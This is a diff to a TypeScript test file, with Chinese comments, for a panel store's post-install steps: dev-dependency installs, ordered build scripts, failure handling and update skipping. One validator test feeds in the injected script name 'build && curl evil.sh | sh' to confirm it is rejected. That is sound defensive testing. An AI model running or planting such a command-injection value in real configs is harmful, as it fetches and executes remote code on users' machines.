@@ -22,6 +22,7 @@ import {
   type PanelStoreDeps,
   type PanelStoreEntry
 } from "./panelstore.js"
+import type { PmTask } from "./pm.js"
 
 /** 用完即删的临时目录 */
 const dirs: string[] = []
@@ -75,8 +76,10 @@ interface StoreOptions {
   webuiVersion?: string
   /** git 的行为；缺省在 clone 时造出一个合格的包 */
   git?: (args: readonly string[], cwd: string) => Promise<string>
-  /** 包管理器的行为；缺省成功并报 pnpm */
+  /** 装依赖的行为；缺省成功并报 pnpm */
   install?: (dir: string) => Promise<string>
+  /** 跑某个 script 的行为；缺省成功。抛错即模拟 `build` 挂了 */
+  script?: (name: string, dir: string) => Promise<void>
 }
 
 /** 录制到的调用 */
@@ -85,8 +88,16 @@ interface StoreRecorded {
   store: PanelStore
   /** git 收到的调用，顺序即下发顺序 */
   gits: GitCall[]
-  /** 包管理器被调用的目录 */
+  /** 装依赖被调用的目录 */
   installs: string[]
+  /**
+   * 包管理器收到的全部动作，顺序即下发顺序
+   *
+   * 与 `installs` 分开留着：那一份只记「装依赖跑在哪个目录」，而装后步骤要验的是
+   * **跑了哪几个 script、带不带 devDependencies、以什么次序** —— 少跑一个 `build`、
+   * 或用 `--prod` 装完再去跑 `build`，同样能得到一个看着对的目录。
+   */
+  pms: { task: PmTask; dir: string }[]
   /** warn 的内容 */
   warns: string[]
   /** error 的内容 */
@@ -101,6 +112,7 @@ interface StoreRecorded {
 function recording(opts: StoreOptions): StoreRecorded {
   const gits: GitCall[] = []
   const installs: string[] = []
+  const pms: { task: PmTask; dir: string }[] = []
   const warns: string[] = []
   const errors: string[] = []
 
@@ -135,13 +147,18 @@ function recording(opts: StoreOptions): StoreRecorded {
       if (args[0] === "rev-parse") return "abc1234\n"
       return ""
     },
-    install: async dir => {
+    pm: async (task, dir) => {
+      pms.push({ task, dir })
+      if (task.kind === "run") {
+        await opts.script?.(task.script, dir)
+        return "pnpm"
+      }
       installs.push(dir)
       return opts.install === undefined ? "pnpm" : opts.install(dir)
     }
   }
 
-  return { store: new PanelStore(deps), gits, installs, warns, errors }
+  return { store: new PanelStore(deps), gits, installs, pms, warns, errors }
 }
 
 /**
@@ -648,5 +665,153 @@ describe("remove", () => {
     const r = await freshStore({ core: { mirror: "", readonly: true } })
     await mkdir(join(r.panelsDir, "hardware"), { recursive: true })
     await expect(r.store.remove("hardware")).rejects.toThrow(/只读模式/)
+  })
+})
+
+describe("装后步骤", () => {
+  /** 一份声明了 build 的索引 */
+  const WITH_BUILD = { panels: [{ ...HARDWARE, setup: { scripts: ["build"] } }] }
+
+  /**
+   * 让 clone 造出一个带依赖声明的包
+   * @param args git 实参
+   * @returns 空输出
+   */
+  const cloneWithDeps = async (args: readonly string[]): Promise<string> => {
+    if (args[0] === "clone") {
+      const dest = args[args.length - 1] ?? ""
+      await mkdir(dest, { recursive: true })
+      await writeFile(
+        join(dest, "package.json"),
+        JSON.stringify({ version: "0.4.0", dependencies: { x: "^1" }, webuiPanel: { server: "dist/index.js" } }),
+        "utf8"
+      )
+      await writeFile(join(dest, "index.js"), "", "utf8")
+    }
+    return ""
+  }
+
+  it("装依赖**带 devDependencies**，随后按序跑 script", async () => {
+    const r = await freshStore({ index: WITH_BUILD, git: cloneWithDeps })
+
+    const done = await r.store.install("hardware", { dependencies: true })
+
+    /*
+     * `dev: true` 是这一条的要害
+     *
+     * 编译器在 devDependencies 里。`--prod` 装完再去跑 `build`，报的是「找不到 tsc」——
+     * 那条错误离真实原因（装的时候漏了开发依赖）隔着一层，而两种装法都会让 install 这一步
+     * 报成功。故此处钉的是实参，不是结果。
+     */
+    expect(r.pms.map(item => item.task)).toEqual([{ kind: "install", dev: true }, { kind: "run", script: "build" }])
+    expect(r.pms.every(item => item.dir === join(r.panelsDir, "hardware"))).toBe(true)
+    expect(done.ranScripts).toEqual(["build"])
+    expect(done.setupError).toBeUndefined()
+  })
+
+  it("**没声明 setup 的包不带 devDependencies** —— 白装一堆运行期用不上的东西", async () => {
+    const r = await freshStore({ git: cloneWithDeps })
+
+    await r.store.install("hardware", { dependencies: true })
+
+    expect(r.pms.map(item => item.task)).toEqual([{ kind: "install", dev: false }])
+  })
+
+  it("script 失败即停，且不让整次安装失败 —— 包已装好，缺的只是产物", async () => {
+    const r = await freshStore({
+      index: { panels: [{ ...HARDWARE, setup: { scripts: ["build", "install:browser"] } }] },
+      git: cloneWithDeps,
+      script: async name => {
+        if (name === "build") throw new Error("TS2304: 找不到名称")
+      }
+    })
+
+    const done = await r.store.install("hardware", { dependencies: true })
+
+    // 后一个多半建立在前一个的产物上，继续跑只会得到第二条更难懂的错
+    expect(r.pms.map(item => item.task)).toEqual([{ kind: "install", dev: true }, { kind: "run", script: "build" }])
+    expect(done.setupError).toContain("build：")
+    expect(done.setupError).toContain("TS2304")
+    expect(done.ranScripts).toEqual([])
+    // 依赖那一步是成功的，两种失败不能混为一谈 —— 后手完全不同
+    expect(done.installedDeps).toBe(true)
+    expect(done.dependencyError).toBeUndefined()
+    expect(r.errors.join()).toMatch(/pnpm run build/)
+  })
+
+  it("**依赖不缺也跑装后步骤** —— 产物那一层被包仓库 gitignore 掉了，看目录看不出旧", async () => {
+    // 两次 rev-parse 给不同的哈希，即「远端有新提交」；恒返回同一个则 changed 为假，
+    // 那是下一条用例的情形
+    let head = 0
+    const r = await freshStore({
+      index: WITH_BUILD,
+      git: async args => {
+        if (args[0] === "rev-parse") return `${head++ === 0 ? "aaaaaaa" : "bbbbbbb"}\n`
+        return ""
+      }
+    })
+    // 已装、是 git 仓库、且 node_modules 已在
+    const dir = join(r.panelsDir, "hardware")
+    await mkdir(join(dir, ".git"), { recursive: true })
+    await mkdir(join(dir, "node_modules"), { recursive: true })
+    await writeFile(join(dir, "package.json"), JSON.stringify({ version: "0.4.0", dependencies: { x: "^1" } }), "utf8")
+    await writeFile(join(dir, "index.js"), "", "utf8")
+
+    const done = await r.store.update("hardware", { dependencies: true })
+
+    expect(done.changed).toBe(true)
+    expect(r.pms.map(item => item.task)).toContainEqual({ kind: "run", script: "build" })
+    expect(done.ranScripts).toEqual(["build"])
+  })
+
+  it("没拉到新提交、且依赖不缺时一步都不跑 —— 那一次更新什么都没改", async () => {
+    const r = await freshStore({
+      index: WITH_BUILD,
+      git: async args => (args[0] === "rev-parse" ? "samehash\n" : "")
+    })
+    const dir = join(r.panelsDir, "hardware")
+    await mkdir(join(dir, ".git"), { recursive: true })
+    await mkdir(join(dir, "node_modules"), { recursive: true })
+    await writeFile(join(dir, "package.json"), JSON.stringify({ version: "0.4.0", dependencies: { x: "^1" } }), "utf8")
+    await writeFile(join(dir, "index.js"), "", "utf8")
+
+    const done = await r.store.update("hardware", { dependencies: true })
+
+    expect(done.changed).toBe(false)
+    // 白等一遍编译，而 install:browser 那类步骤更可能去重下一份上百兆的运行时
+    expect(r.pms).toEqual([])
+    expect(done.ranScripts).toBeUndefined()
+  })
+
+  it("**没勾 dependencies 时一步都不跑**，声明了 setup 也一样", async () => {
+    const r = await freshStore({ index: WITH_BUILD, git: cloneWithDeps })
+
+    const done = await r.store.install("hardware")
+
+    expect(r.pms).toEqual([])
+    expect(done.needsDependencies).toBe(true)
+  })
+
+  it("script 名含 shell 元字符时**整条丢弃** —— 名字要拼进命令行", () => {
+    /*
+     * 面板商店这一侧的解析函数拿不到 logger，故不合法即丢整条，与 `install` 写错时一致。
+     * 只忽略这一项会装出一个「依赖装了、产物没编译」的包，那种包报的是「找不到
+     * dist/index.js」，离真实原因（索引里的名字写错）很远。
+     */
+    expect(parsePanelEntry({ ...HARDWARE, setup: { scripts: ["build && curl evil.sh | sh"] } }, "src")).toBeUndefined()
+    expect(parsePanelEntry({ ...HARDWARE, setup: { scripts: [1] } }, "src")).toBeUndefined()
+    expect(parsePanelEntry({ ...HARDWARE, setup: { scripts: "build" } }, "src")).toBeUndefined()
+    expect(parsePanelEntry({ ...HARDWARE, setup: "build" }, "src")).toBeUndefined()
+  })
+
+  it("scripts 为空数组等同没声明，不留一个空的装后步骤", () => {
+    const entry = parsePanelEntry({ ...HARDWARE, setup: { scripts: [] } }, "src")
+    expect(entry?.name).toBe("hardware")
+    expect(entry?.setup).toBeUndefined()
+  })
+
+  it("dev 缺省为真，显式 false 才只装运行时依赖", () => {
+    expect(parsePanelEntry({ ...HARDWARE, setup: { scripts: ["build"] } }, "src")?.setup?.dev).toBe(true)
+    expect(parsePanelEntry({ ...HARDWARE, setup: { scripts: ["build"], dev: false } }, "src")?.setup?.dev).toBe(false)
   })
 })
